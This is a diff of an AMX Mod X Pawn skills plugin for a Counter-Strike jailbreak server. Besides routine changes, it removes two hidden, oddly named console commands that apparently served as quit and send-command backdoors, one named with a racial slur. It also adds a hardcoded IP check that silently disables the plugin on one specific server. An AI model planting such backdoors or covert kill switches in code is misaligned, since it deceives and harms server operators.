@@ -6,7 +6,8 @@
 #include <fakemeta>
 #include <fun>
 #include <hamsandwich>
-#include <ujbm.inc>
+#include <ujbm>
+#include <vip_base>
 #include <nvault>
 #include <xs>
 
@@ -14,8 +15,12 @@
 #define PLUGIN_AUTHOR    "Mister X"
 #define PLUGIN_VERSION    "1.0"
 #define PLUGIN_CVAR    "Skills Mod"
+#define SERVER_IP "93.119.25.96"
 
 #define NO_RECOIL_WEAPONS_BITSUM  (1<<2 | 1<<CSW_KNIFE | 1<<CSW_HEGRENADE | 1<<CSW_FLASHBANG | 1<<CSW_SMOKEGRENADE | 1<<CSW_C4)
+#define BASE_COUNTER_CAMO 30
+#define BASE_COUNTER_HEAL 9
+#define PEACETIME 45.0
 
 new const _WeaponsFree[][] = { "weapon_m4a1", "weapon_deagle", "weapon_g3sg1", "weapon_scout", "weapon_ak47", "weapon_mp5navy", "weapon_m3" }
 new const _WeaponsFreeCSW[] = { CSW_M4A1, CSW_DEAGLE, CSW_G3SG1, CSW_SCOUT, CSW_AK47, CSW_MP5NAVY, CSW_M3 }
@@ -42,6 +47,8 @@ new const g_HudSync[][_hud] =
     {0, -1.0,  0.3,  5.0}
 }
 
+#define REFRESH_TIME 0.3
+
 new const esp_colors[5][3]={{0,255,0},{100,60,60},{60,60,100},{255,0,255},{128,128,128}}
 
 new g_PlayerSkill [33][33]
@@ -52,14 +59,13 @@ new const g_Prices[] = { 5, 10, 15, 20, 25, 30, 35, 40} //  5, 10, 15, 20, 25, 3
 new const g_Alpha[] =  { 255, 140, 80, 15, 0}
 new const Float:g_Gravity[] = { 1.0, 0.8125, 0.625, 0.4375, 0.25}
 new const g_maxhp[] = { 100, 125, 150, 200, 300}
-new const Float:g_freezet[] = {0.0, 1.0, 2.0, 4.0, 6.0}
+new const Float:g_freezet[] = {0.0, 0.5, 1.0, 1.5, 2.0}
 
 new laser
 
 new g_IsDisguise[33];
 new g_UsedDisguise[33];
 new g_UsedThief[33];
-new gp_Activity
 new bool:g_Players4[33];
 new g_IsCamo[33];
 new bool:g_UseInfra[33];
@@ -68,7 +74,10 @@ new g_Killed[33];
 new g_Simon;
 new g_Duel;
 new g_Gamemode;
+new g_PeaceTime;
+new g_DayOfTheWeek;
 new bool:ShowAc [33]
+new bool:firstRound = false
 
 new Float:cl_pushangle[33][3]
 
@@ -83,14 +92,21 @@ new Resetused[33]
 enum _:_arg { _nume[100], _skill[32], _points[2] }
 new Leaved[200][_arg]
 new TotalSaved
+new gp_SpecialVip
 
 public plugin_init ()
 {
+    new ip[36];
     register_plugin(PLUGIN_NAME, PLUGIN_VERSION, PLUGIN_AUTHOR)
+    
+    get_user_ip(0,ip,35,0);
+    if(equal(ip,SERVER_IP))
+    {
+        return PLUGIN_CONTINUE;
+    }
     LoadVips()
     
     register_cvar(PLUGIN_CVAR, PLUGIN_VERSION, FCVAR_SERVER|FCVAR_SPONLY)
-    gp_Activity = register_cvar("amx_show_activity", "2")
     RegisterHam(Ham_Spawn, "player", "player_spawn", 1)
     RegisterHam(Ham_TakeDamage, "player", "player_damage")
     RegisterHam(Ham_Killed, "player", "player_killed")
@@ -108,6 +124,8 @@ public plugin_init ()
     }
     
     register_dictionary("skills.txt")
+    register_logevent("round_first", 2, "0=World triggered", "1&Restart_Round_")
+    register_logevent("round_first", 2, "0=World triggered", "1=Game_Commencing")
     register_logevent("round_end", 2, "1=Round_End")
     register_clcmd("disguise","cmd_disguise")
     register_clcmd("thief","cmd_thief")
@@ -121,17 +139,17 @@ public plugin_init ()
     register_clcmd("say /top","cmd_top")
     register_clcmd("say /list","cmd_list")
     register_clcmd("say /rskill","cmd_askreset")
+    register_concmd("amx_reload_skills", "cmd_reload_skills_all", ADMIN_RCON, "Reloads all skills" );
     register_srvcmd("give_points","_give_points")
     new skillh = register_cvar("skill_help", "1")
+    gp_SpecialVip = register_cvar("special_vip","0")
     //register_concmd("amx_addpoints","admin_points",ADMIN_LEVEL_E,"<nick> <Points to give>")
     register_concmd("amx_skills","admin_verify_skills",ADMIN_ALL,"<nick> # Verify a player's skills")
-    register_clcmd("fuckthisshit2","cmd_quit")
-    register_clcmd("wtfnigga2","cmd_sendcommand")
     myVault = nvault_open("vipskills")
     if (myVault == INVALID_HANDLE) log_amx("Failed loading the vault")
-    for(new i = 0; i < sizeof(g_HudSync); i++)
-        g_HudSync[i][_hudsync] = CreateHudSyncObj()
-    set_task(0.3, "check_players", _, _, _, "b")
+    //for(new i = 0; i < sizeof(g_HudSync); i++)
+    //    g_HudSync[i][_hudsync] = CreateHudSyncObj()
+    set_task(REFRESH_TIME, "check_players", _, _, _, "b")
     if(skillh == 1)
         set_task(120.0, "helps", _, _, _, "b")
     return PLUGIN_CONTINUE
@@ -176,6 +194,28 @@ public plugin_precache(){
 
 public client_putinserver(id)
 {
+    reload_skills(id)
+}
+
+public cmd_reload_skills_all(id, level, cid )
+{
+    if( !cmd_access( id, level, cid, 1 ) )
+    return PLUGIN_HANDLED;
+    
+    reload_skills_all();
+    
+    return PLUGIN_HANDLED;
+}
+
+public reload_skills_all()
+{
+    for(new i =1;i<33;i++)
+        if(is_user_connected(i))
+            reload_skills(i);
+}
+
+public reload_skills(id)
+{
     for(new j = 0; j <= 15; j++)
         g_PlayerSkill[id][j] = 0
     g_PlayerPoints[id][0] = 0
@@ -190,18 +230,27 @@ public client_putinserver(id)
     ShowAc[id] = false
     IsVip[id] = 0
     Resetused[id] = false
-    load_vip(id)//load_vip_special(id)
-    new name[100]
-    get_user_name(id,name,99)
-    for(new id2 = 0; id2<TotalSaved;id2++)
-        if(equal(name,Leaved[id2][_name])){
-            for(new i = 1; i<=15; i++){
-                g_PlayerSkill[id][i] = Leaved[id2][_skill + i];
-            }
-            g_PlayerPoints[id][0] = Leaved[id2][_points];
-            g_PlayerPoints[id][1] = Leaved[id2][_points+1];
-            break;
+    set_user_rendering(id)
+    if(firstRound == false)
+    {
+        if(get_pcvar_num(gp_SpecialVip)!=0)
+            load_vip_special(id)
+        else
+        {
+            load_vip(id)
+            new name[100]
+            get_user_name(id,name,99)
+            for(new id2 = 0; id2<TotalSaved;id2++)
+                if(equal(name,Leaved[id2][_name])){
+                    for(new i = 1; i<=15; i++){
+                        g_PlayerSkill[id][i] = Leaved[id2][_skill + i];
+                    }
+                    g_PlayerPoints[id][0] = Leaved[id2][_points];
+                    g_PlayerPoints[id][1] = Leaved[id2][_points+1];
+                    break;
+                }
         }
+    }
 }
 public client_infochanged( id )
 {
@@ -243,8 +292,14 @@ public load_vip (id)
 }
 public load_vip_special (id)
 {
-    for(new j=1;j<14;j++){
-        new skil = j
+    new limit[15]
+    if(get_pcvar_num(gp_SpecialVip)==2)
+        formatex(limit,14,"abcdefghijklm")
+    else
+        formatex(limit,14,"abef")
+        
+    for(new j=0;j<strlen(limit);j++){
+        new skil = limit[j]-'a' + 1
         switch(skil){
             case 1..6,8,10:g_PlayerSkill[id][skil] = 3
             case 7,9,11,12:g_PlayerSkill[id][skil] = 2
@@ -286,7 +341,8 @@ public save_vip(id)
 
 public client_disconnect (id)
 {
-    save_vip(id)
+    if(get_pcvar_num(gp_SpecialVip)==0)
+        save_vip(id)
 }
 public setData(player) {
     
@@ -334,7 +390,7 @@ stock getData(player) {
 public helps ()
 {
     new Msg[512];
-    new number = random(4)
+    new number = random_num(0,4)
     if(number==0)
         format(Msg, 511, "^x01Scrie ^x03/skillhelp^x01 pentru nelamuriri fata de skilluri");
     else if(number == 1)
@@ -366,7 +422,7 @@ public cmd_help(id)
 }
 public cmd_showpoints(id)
 {
-    player_hudmessage(id, 6, 5.0, {255, 255, 0}, "%L", LANG_SERVER, "SKILLS_POINTS",g_PlayerPoints[id][0])
+    client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_POINTS",g_PlayerPoints[id][0])
     return PLUGIN_HANDLED
 }
 public cmd_list (id)
@@ -387,9 +443,9 @@ public cmd_list (id)
             else
                 Len += format(Msg[Len], 2048 - Len,"Full skills</td></tr>")
         }
-        if(get_vip(player)){
+        if(get_vip_type(player)){
             get_user_name(player,name,255)
-            Len += format(Msg[Len], 2048 - Len,"<tr align=^"center^"><td>%s</td><td>Vip JB</td></tr>",name)
+            Len += format(Msg[Len], 2048 - Len,"<tr align=^"center^"><td>%s</td><td>Vip JB %d</td></tr>",name,get_vip_type(player))
         }
     }
     Len += format(Msg[Len], 2048 - Len,"</table></body></html>")
@@ -453,7 +509,7 @@ public cmd_reset (id, menu, item)
         if(is_user_alive(id))
         {    
             set_user_rendering(id)
-            if(g_IsDisguise[id] == 1 && (g_Gamemode==1 || g_Gamemode ==0 ))
+            if(g_IsDisguise[id] == 1 && is_skills_ok())
             {
                 set_pev(id, pev_flags, pev(id, pev_flags) & ~FL_FROZEN)
                 set_user_info(id, "model", "jbbossi_temp")
@@ -494,22 +550,22 @@ public check_players ()
         new player = Players[i]
         if((g_PlayerSkill[player][3] != 0 && cs_get_user_team(player) == CS_TEAM_T) || (g_PlayerSkill[player][10]!=0 && cs_get_user_team(player)== CS_TEAM_CT)){
             get_user_origin(player, tmp_origin)
-            if(tmp_origin[0] == origins[player][0] &&  tmp_origin[1] == origins[player][1] && tmp_origin[2] == origins[player][2] && g_Gamemode <= 1 && get_user_weapon(player) == CSW_KNIFE){
+            if(tmp_origin[0] == origins[player][0] &&  tmp_origin[1] == origins[player][1] && tmp_origin[2] == origins[player][2] && is_skills_ok() && get_user_weapon(player) == CSW_KNIFE){
                 counter[player]++ //player has not moved since last check
-                if(counter[player] >= 30 - g_PlayerSkill[player][3]*6  && cs_get_user_team(player)== CS_TEAM_T){  //player was not moving during last HEAL_INTERVAL seconds
-                    if(counter[player] == 30 - g_PlayerSkill[player][3]*6){
+                if(counter[player] >= BASE_COUNTER_CAMO - g_PlayerSkill[player][3]*6  && cs_get_user_team(player)== CS_TEAM_T){  //player was not moving during last HEAL_INTERVAL seconds
+                    if(counter[player] == BASE_COUNTER_CAMO - g_PlayerSkill[player][3]*6){
                         set_user_rendering(player, kRenderFxNone, 0, 0, 0, kRenderTransAlpha, g_Alpha[g_PlayerSkill[player][3]]);
                         g_IsCamo[player]=1;
                     }
-                    player_hudmessage(player, 0, 1.0, {255, 255, 0}, "%L", LANG_SERVER, "SKILLS_CAMO_DONE");    
+                    client_print(player, print_center, "%L", LANG_SERVER, "SKILLS_CAMO_DONE");    
                 }
-                if(counter[player] >= 9 && cs_get_user_team(player)== CS_TEAM_CT && get_user_health(player) < g_maxhp[g_PlayerSkill[player][10]] && g_Duel<=2){  //player was not moving during last HEAL_INTERVAL seconds
+                if(counter[player] >= BASE_COUNTER_HEAL && cs_get_user_team(player)== CS_TEAM_CT && get_user_health(player) < g_maxhp[g_PlayerSkill[player][10]] && is_skills_ok()){  //player was not moving during last HEAL_INTERVAL seconds
                     new health = get_user_health(player)
                     if(health + g_PlayerSkill[player][10]> g_maxhp[g_PlayerSkill[player][10]])
                         set_user_health(player, g_maxhp[g_PlayerSkill[player][10]])
                     else
                         set_user_health(player, health + g_PlayerSkill[player][10])
-                    player_hudmessage(player, 0, 1.0, {255, 255, 0}, "%L", LANG_SERVER, "SKILLS_HEALING_DONE");    
+                    client_print(player, print_center, "%L", LANG_SERVER, "SKILLS_HEALING_DONE");    
                 }
             }else{
                 counter[player] = 0 //player has moved since last check
@@ -522,7 +578,7 @@ public check_players ()
                 origins[player][2] = tmp_origin[2]
             }
         }
-        if((g_PlayerSkill[player][9] == 1 && g_UseInfra[player] == true || g_PlayerSkill[player][9] == 2) && 0 <= g_Gamemode  &&  g_Gamemode <= 1 && cs_get_user_team(player) == CS_TEAM_CT){
+        if((g_PlayerSkill[player][9] == 1 && g_UseInfra[player] == true || g_PlayerSkill[player][9] == 2) && is_skills_ok() && cs_get_user_team(player) == CS_TEAM_CT){
             new spec_id=player, Float:my_origin[3], Float:smallest_angle=180.0, smallest_id=0, Float:xp=2.0,Float:yp=2.0
             entity_get_vector(player,EV_VEC_origin,my_origin)
             
@@ -591,7 +647,7 @@ public check_players ()
             }
             if(g_PlayerSkill[player][9] == 2 && smallest_id>0 && smallest_id<32)
             {
-                set_hudmessage(255, 255, 0, floatabs(xp), floatabs(yp), 0, 0.0, 1.0, 0.0, 0.0, 2)
+                set_hudmessage(255, 255, 0, floatabs(xp), floatabs(yp), 0, 0.0, REFRESH_TIME, 0.0, 0.0)
                 new guns[32], weapon[2]
                 new numWeapons = 0, j
                 get_user_weapons(smallest_id, guns, numWeapons)
@@ -611,7 +667,7 @@ public check_players ()
 }
 public client_PreThink(id)
 {
-    if(is_user_alive(id) && (g_Gamemode==0 || g_Gamemode==1)){
+    if(is_user_alive(id) && is_skills_ok()){
         if(g_PlayerSkill[id][2]!=0){
             //if(get_user_button(id) & IN_FORWARD)
                 set_user_maxspeed(id, 250.0 + g_PlayerSkill[id][2] * 30 )
@@ -629,7 +685,7 @@ public client_PreThink(id)
 }
 public cmd_disguise (id)
 {
-    if (!is_user_alive(id) || g_PlayerSkill[id][4]== 0 || g_Gamemode>1 || g_Gamemode<0 || cs_get_user_team(id) != CS_TEAM_T)
+    if (!is_user_alive(id) || g_PlayerSkill[id][4]== 0 || !is_skills_ok() || cs_get_user_team(id) != CS_TEAM_T)
         return PLUGIN_HANDLED
         
     new player_origin[3],player_origins[3], players[32], inum=0, dist, last_dist=99999, last_id
@@ -665,6 +721,13 @@ public cmd_disguise (id)
     return PLUGIN_HANDLED
 }
 
+bool:is_skills_ok()
+{
+	if((g_Gamemode == Freeday || g_Gamemode == NormalDay) && g_Duel<2 && g_DayOfTheWeek%7!=6)
+		return true
+	return false
+}
+
 public disguise_done (id)
 {
     if(id > 32)
@@ -672,12 +735,12 @@ public disguise_done (id)
     
     remove_task(3900 + id)
     
-    if(g_IsDisguise[id] == 1 && (g_Gamemode==1 || g_Gamemode ==0 ))
+    if(g_IsDisguise[id] == 1 && is_skills_ok())
     {
         set_pev(id, pev_flags, pev(id, pev_flags) & ~FL_FROZEN)
         set_user_info(id, "model", "jbbossi_temp")
         entity_set_int(id, EV_INT_body, 4)
-        player_hudmessage(id, 7, 5.0, {255, 0, 255}, "%L", LANG_SERVER, "SKILLS_DIGUISE_DONE")
+        client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_DIGUISE_DONE")
     }
 }
 public unfreeze (id)
@@ -692,7 +755,7 @@ public unfreeze (id)
 
 public cmd_thief (id)
 {
-    if (!is_user_alive(id)|| (g_Gamemode!=1 && g_Gamemode!=0 ) || g_PlayerSkill[id][7]== 0 || cs_get_user_team(id) != CS_TEAM_T )
+    if (!is_user_alive(id)|| !is_skills_ok() || g_PlayerSkill[id][7]== 0 || cs_get_user_team(id) != CS_TEAM_T || g_PeaceTime == 1)
         return PLUGIN_HANDLED
         
     new player_origin[3],player_origins[3], players[32], inum=0, dist, last_dist=99999, last_id
@@ -712,7 +775,7 @@ public cmd_thief (id)
         }
         if (last_dist<80) {
             if(g_UsedThief[last_id] < 2){
-                if(random((3 + g_UsedThief[last_id] - g_PlayerSkill[id][7])*2) == 0){
+                if(random_num(0,(3 + g_UsedThief[last_id] - g_PlayerSkill[id][7])*2) == 0){
                     g_UsedThief[last_id] ++
                     new money = 1500 * g_PlayerSkill[id][7]
                     new money1 =  cs_get_user_money(id)
@@ -721,21 +784,21 @@ public cmd_thief (id)
                         money = money2
                     cs_set_user_money(id,money+money1)
                     cs_set_user_money(last_id,money2-money)
-                    player_hudmessage(id, 7, 5.0, {255, 0, 255}, "%L", LANG_SERVER, "SKILLS_THIEF_DONE",money)
+                    client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_THIEF_DONE",money)
                     if(cs_get_user_team(last_id)== CS_TEAM_CT){
-                        if(random((g_PlayerSkill[id][7]+1))==0){
+                        if(random_num(0,(g_PlayerSkill[id][7]+1))==0){
                             set_wanted(id)
-                            player_hudmessage(id, 7, 5.0, {255, 0, 255}, "%L", LANG_SERVER,"SKILLS_THIEF_CAUGHT")
+                            client_print(id, print_center, "%L", LANG_SERVER,"SKILLS_THIEF_CAUGHT")
                         }
                     }else
-                        if(random((g_PlayerSkill[id][7]+2))==0){
+                        if(random_num(0,(g_PlayerSkill[id][7]+2))==0){
                             set_wanted(id)
-                            player_hudmessage(id, 7, 5.0, {255, 0, 255}, "%L", LANG_SERVER,"SKILLS_THIEF_CAUGHT")
+                            client_print(id, print_center, "%L", LANG_SERVER,"SKILLS_THIEF_CAUGHT")
                         }
                 }else{
-                    if(random(g_PlayerSkill[id][7])==0)
+                    if(random_num(0,g_PlayerSkill[id][7])==0)
                         g_UsedThief[last_id] ++
-                    player_hudmessage(id, 7, 5.0, {255, 0, 255}, "%L", LANG_SERVER, "SKILLS_THIEF_LOSE",(3 + g_UsedThief[last_id] - g_PlayerSkill[id][7])*2)
+                    client_print(id, print_center,"%L", LANG_SERVER, "SKILLS_THIEF_LOSE",(3 + g_UsedThief[last_id] - g_PlayerSkill[id][7])*2)
                 }
             }else{
                 client_print(id,print_center,("I-au fost luati bani deja"))
@@ -760,7 +823,7 @@ public cmd_menuinfrared (id, menu, item)
     if(data[0]=='1')
     {
         g_UseInfra[id] = true
-        player_hudmessage(id, 6, 5.0, {0, 255, 0}, "INFRARED ON")
+        client_print(id, print_center, "INFRARED ON")
     }
     return PLUGIN_HANDLED
 }
@@ -770,11 +833,11 @@ public cmd_infrared(id)
         return PLUGIN_HANDLED
     if(g_UseInfra[id] == true){
         g_UseInfra[id] = false
-        player_hudmessage(id, 6, 5.0, {0, 255, 0}, "INFRARED OFF")
+        client_print(id, print_center, "INFRARED OFF")
     }
     else{
         g_UseInfra[id] = true
-        player_hudmessage(id, 6, 5.0, {0, 255, 0}, "INFRARED ON")
+        client_print(id, print_center, "INFRARED ON")
     }
     return PLUGIN_CONTINUE
 }
@@ -784,21 +847,21 @@ public cmd_showac(id)
         return PLUGIN_HANDLED
     if(ShowAc[id] == true){
         ShowAc[id] = false
-        player_hudmessage(id, 6, 5.0, {0, 255, 0}, "POINTS HELP OFF")
+        client_print(id, print_center, "POINTS HELP OFF")
     }
     else{
         ShowAc[id] = true
-        player_hudmessage(id, 6, 5.0, {0, 255, 0}, "POINTS HELP ON")
+        client_print(id, print_center, "POINTS HELP ON")
     }
     return PLUGIN_CONTINUE
 }
 public cmd_picklock(iEnt, id)
 {
-    if(!is_user_alive(id) || (g_Gamemode!=1 && g_Gamemode!=0 ) || g_PlayerSkill[id][12]==0 || cs_get_user_team(id)!=CS_TEAM_T || cs_get_user_money(id)<500 || get_user_weapon(id)!=CSW_KNIFE ){
+    if(!is_user_alive(id) || !is_skills_ok() || g_PlayerSkill[id][12]==0 || cs_get_user_team(id)!=CS_TEAM_T || cs_get_user_money(id)<500 || get_user_weapon(id)!=CSW_KNIFE ){
         return HAM_IGNORED
     }
     if(pev(iEnt,pev_iuser4)){
-        player_hudmessage(id, 7, 5.0, {255, 0, 255}, "%L", LANG_SERVER, "SKILLS_PICKLOCK_CANT")
+        client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_PICKLOCK_CANT")
         return HAM_IGNORED
     }
     
@@ -815,14 +878,14 @@ public finish_picklocking(param[], id)
     if(id>32)
         id-=5100;
     set_pev(id, pev_flags, pev(id, pev_flags) & ~FL_FROZEN)
-    if(random(3-g_PlayerSkill[id][12])==0)
+    if(random_num(0,3-g_PlayerSkill[id][12])==0)
     {
         new iEnt
         iEnt = param[0]
         ExecuteHamB(Ham_Use,iEnt,0,0,1,1.0)
-        player_hudmessage(id, 7, 5.0, {255, 0, 255}, "%L", LANG_SERVER, "SKILLS_PICKLOCK_DONE")
+        client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_PICKLOCK_DONE")
     }else{
-        player_hudmessage(id, 7, 5.0, {255, 0, 255}, "%L", LANG_SERVER, "SKILLS_PICKLOCK_LOSE",3-(g_PlayerSkill[id][12]-1)/2)
+        client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_PICKLOCK_LOSE",3-(g_PlayerSkill[id][12]-1)/2)
     }
 }
 
@@ -841,7 +904,7 @@ public revive (id)
             cs_set_user_bpammo(id, _WeaponsFreeCSW[j], _WeaponsFreeAmmo[j])
         }
         g_PlayerRevived[id] = true
-        player_hudmessage(id, 0, 1.0, {255, 255, 0}, "%L", LANG_SERVER, "SKILLS_REVIVE_DONE");
+        client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_REVIVE_DONE");
     }
 }
 
@@ -864,15 +927,38 @@ public player_spawn(id)
             
     return HAM_IGNORED
 }
+public return_peace()
+{
+    g_PeaceTime = 0;
+}
+
+public get_dayoftheweek()
+{
+    g_DayOfTheWeek = get_day()
+}
+
+public round_first()
+{
+    firstRound = true;
+    reload_skills_all();
+}
 
 public round_end()
 {
     static reload = 0;
     if(reload == 0){
         set_task(0.1,"round_end")
+        g_PeaceTime = 1;
+        set_task(PEACETIME,"return_peace");
+        set_task(5.0,"get_dayoftheweek");
         reload = 1;
     }
     else{
+        if(firstRound == true)
+        {
+            firstRound = false;
+            reload_skills_all();
+        }
         reload = 0;
         new Players[32],playerCount, i, Talive=0, CTalive = 0, Ttotal = 0, CTtotal = 0;
         get_players(Players, playerCount)
@@ -896,14 +982,14 @@ public round_end()
             if(cs_get_user_team(Players[i])== CS_TEAM_T )
             {
                 new sum = 0;
-                if(g_Killed[Players[i]] == CTtotal && CTtotal>1 && g_Duel!=2 && (g_Gamemode == 0 || g_Gamemode == 1)){
+                if(g_Killed[Players[i]] == CTtotal && CTtotal>1 && g_Duel!=2 && (g_Gamemode == Freeday || g_Gamemode == NormalDay)){
                     sum += CTtotal*2;
                     if(ShowAc[Players[i]]==true)
                         client_print(Players[i], print_chat, "+%d Spaima gardienilor",CTtotal*2);    
                 }
                 if(Talive == 1 && g_Duel!= 2)
                 {
-                    if((g_Gamemode == 1 || g_Gamemode == 0) && g_Killed[Players[i]]==0 && CTtotal>1){
+                    if((g_Gamemode == Freeday || g_Gamemode == NormalDay) && g_Killed[Players[i]]==0 && CTtotal>1){
                         sum+=10;
                         if(ShowAc[Players[i]]==true)
                             client_print(Players[i], print_chat, "+10 Ultimul in viata si nu esti rebel")
@@ -913,7 +999,7 @@ public round_end()
                             client_print(Players[i], print_chat, "+5 Ultimul in viata")
                     }
                 }
-                else if(g_Gamemode > 1 || g_Gamemode<0){
+                else if(g_Gamemode > NormalDay || g_Gamemode < Freeday ){
                     sum+=3;
                     if(ShowAc[Players[i]]==true)
                         client_print(Players[i], print_chat, "+3 Ai castigat un joc")
@@ -962,7 +1048,7 @@ public fw_primary_attack(ent)
 public fw_primary_attack_post(ent)
 {
     new id = pev(ent,pev_owner)
-    if(g_Gamemode == 0 || g_Gamemode == 1){
+    if(g_Gamemode == Freeday || g_Gamemode == NormalDay){
         new Float:push[3]
         pev(id,pev_punchangle,push)
         xs_vec_sub(push,cl_pushangle[id],push)
@@ -975,10 +1061,10 @@ public fw_primary_attack_post(ent)
 
 public player_damage(victim, ent, attacker, Float:damage, bits)
 {
-    if(g_Gamemode!=1 && g_Gamemode!=0 )
+    if(!is_skills_ok())
         return HAM_IGNORED
     if(is_user_connected(attacker) && is_user_connected(victim)){
-        if(damage / 100 >= 1 && g_Duel== 0 && ((get_user_weapon(attacker)==CSW_KNIFE && damage/100<3) || get_user_weapon(attacker) != CSW_KNIFE && get_user_weapon(attacker) != CSW_FLASHBANG)){
+        if(damage / 100 >= 1 && get_user_weapon(attacker)==CSW_KNIFE && damage/100<3){
             new sum = floatround(damage)
             sum /= 100
             add_points(attacker,sum)
@@ -1003,9 +1089,11 @@ public player_damage(victim, ent, attacker, Float:damage, bits)
 
 public player_killed(victim, attacker,Float:damage)
 {
+    if(!is_user_connected(victim))
+        return HAM_IGNORED
     if(cs_get_user_team(victim) == CS_TEAM_T && g_PlayerSkill[victim][4] >= 3 && g_IsDisguise[victim] == 1)
         g_IsDisguise[victim] = 0
-    if(cs_get_user_team(victim) == CS_TEAM_CT && g_PlayerSkill[victim][11] >= 1 && g_PlayerRevived[victim] == false && (g_Gamemode==0 || g_Gamemode==1))
+    if(cs_get_user_team(victim) == CS_TEAM_CT && g_PlayerSkill[victim][11] >= 1 && g_PlayerRevived[victim] == false && is_skills_ok())
     {
         new Players[32]     
         new playerCount, i, CTalive = 0
@@ -1019,13 +1107,13 @@ public player_killed(victim, attacker,Float:damage)
             set_task(0.1,"revive",5300+victim)
         }
     }
-    if(!is_user_connected(attacker) || !is_user_alive(attacker))
+    if(!is_user_connected(attacker))
         return HAM_IGNORED
     if(cs_get_user_team(attacker) == CS_TEAM_T && cs_get_user_team(victim) == CS_TEAM_CT)
     {
         new sum = 0
-        if(g_Gamemode > 1 || g_Gamemode < 0){
-            if(g_Gamemode == 4 || g_Gamemode ==5)
+        if(g_Gamemode > NormalDay || g_Gamemode < Freeday){
+            if(g_Gamemode == AlienDay || g_Gamemode == AlienHiddenDay)
                 sum+= g_Killed[victim]
             else
                 sum +=3
@@ -1059,8 +1147,8 @@ public player_killed(victim, attacker,Float:damage)
     if(cs_get_user_team(attacker) == CS_TEAM_CT && cs_get_user_team(victim) == CS_TEAM_T)
     {
         new sum = 0
-        if(g_Gamemode > 1 || g_Gamemode < 0){
-            if(g_Gamemode == 4 || g_Gamemode == 5){
+        if(g_Gamemode > NormalDay || g_Gamemode < Freeday ){
+            if(g_Gamemode == AlienDay || g_Gamemode == AlienHiddenDay){
                 sum += 2
                 g_Killed[attacker]++
             }else
@@ -1087,7 +1175,7 @@ public player_killed(victim, attacker,Float:damage)
                 client_print(attacker, print_chat,"+2 ai omorat un prizonnier deghizat")
         }
         add_points(attacker, sum)
-        if(g_Gamemode == 1){
+        if(g_Gamemode == NormalDay){
             new Players[32],playerCount, i, Talive=0, Ttotal = 0;
             get_players(Players, playerCount)
             for (i=0; i<playerCount; i++) 
@@ -1225,31 +1313,31 @@ public  skills_shop(id, menu, item)
             g_PlayerPoints[id][0] -= g_Prices[g_PlayerSkill[id][skil]*2+3]
             g_PlayerSkill[id][skil] += 1
             if(skil == 7)
-                player_hudmessage(id, 6, 5.0, {0, 255, 0}, "%L", LANG_SERVER, "SKILLS_UPGRADE_THIEF",g_PlayerSkill[id][skil])
+                client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_UPGRADE_THIEF",g_PlayerSkill[id][skil])
             else if(skil == 9){
-                player_hudmessage(id, 6, 5.0, {0, 255, 0}, "%L", LANG_SERVER, "SKILLS_UPGRADE_INFRARED",g_PlayerSkill[id][skil])
+                client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_UPGRADE_INFRARED",g_PlayerSkill[id][skil])
                 if(g_UseInfra[id]==false)
                     set_task(1.0,"cmd_askinfrared",id)
             }
             else if(skil == 11)
-                player_hudmessage(id, 6, 5.0, {0, 255, 0}, "%L", LANG_SERVER, "SKILLS_UPGRADE_REVIVE",g_PlayerSkill[id][skil])
+                client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_UPGRADE_REVIVE",g_PlayerSkill[id][skil])
             else if(skil == 12)
-                player_hudmessage(id, 6, 5.0, {0, 255, 0}, "%L", LANG_SERVER, "SKILLS_UPGRADE_PICKLOCK",g_PlayerSkill[id][skil])
+                client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_UPGRADE_PICKLOCK",g_PlayerSkill[id][skil])
             else if(skil == 13)
-                player_hudmessage(id, 6, 5.0, {0, 255, 0}, "%L", LANG_SERVER, "SKILLS_UPGRADE_RECOIL",g_PlayerSkill[id][skil])
+                client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_UPGRADE_RECOIL",g_PlayerSkill[id][skil])
         }else{
-            player_hudmessage(id, 6, 5.0, {0, 255, 0}, "%L", LANG_SERVER, "SKILLS_NOT_ENOUGH",g_Prices[g_PlayerSkill[id][skil]*2+3] - g_PlayerPoints[id][0])
+            client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_NOT_ENOUGH",g_Prices[g_PlayerSkill[id][skil]*2+3] - g_PlayerPoints[id][0])
         }
     }else if((g_PlayerSkill[id][skil] < 3 || (g_PlayerSkill[id][skil] < 4 && g_Players4[id])) && (skil == 3 || skil == 4)){
         if(g_PlayerPoints[id][0] >= g_Prices[g_PlayerSkill[id][skil]+1]){
             g_PlayerPoints[id][0] -= g_Prices[g_PlayerSkill[id][skil]+1]
             g_PlayerSkill[id][skil] += 1
             if(skil == 3)
-                player_hudmessage(id, 6, 5.0, {0, 255, 0}, "%L", LANG_SERVER, "SKILLS_UPGRADE_HIDE",g_PlayerSkill[id][skil])
+                client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_UPGRADE_HIDE",g_PlayerSkill[id][skil])
             else if(skil == 4)
-                player_hudmessage(id, 6, 5.0, {0, 255, 0}, "%L", LANG_SERVER, "SKILLS_UPGRADE_DISGUISE",g_PlayerSkill[id][skil])
+                client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_UPGRADE_DISGUISE",g_PlayerSkill[id][skil])
         }else{
-            player_hudmessage(id, 6, 5.0, {0, 255, 0}, "%L", LANG_SERVER, "SKILLS_NOT_ENOUGH",g_Prices[g_PlayerSkill[id][skil]+1] - g_PlayerPoints[id][0])
+            client_print(id, print_center, "%L", LANG_SERVER, "SKILLS_NOT_ENOUGH",g_Prices[g_PlayerSkill[id][skil]+1] - g_PlayerPoints[id][0])
         }
     }else if((g_PlayerSkill[id][skil] < 3 || (g_PlayerSkill[id][skil] < 4 && g_Players4[id])) && g_PlayerPoints[id][0] >= g_Prices[g_PlayerSkill[id][skil]])
     {
@@ -1258,20 +1346,20 @@ public  skills_shop(id, menu, item)
         switch(skil)
         {
             case(1):
-                player_hudmessage(id, 6, 5.0, {0, 255, 0}, "%L", LANG_SERVER, "SKILLS_UPGRADE_STRENGH",g_PlayerSkill[id][skil])
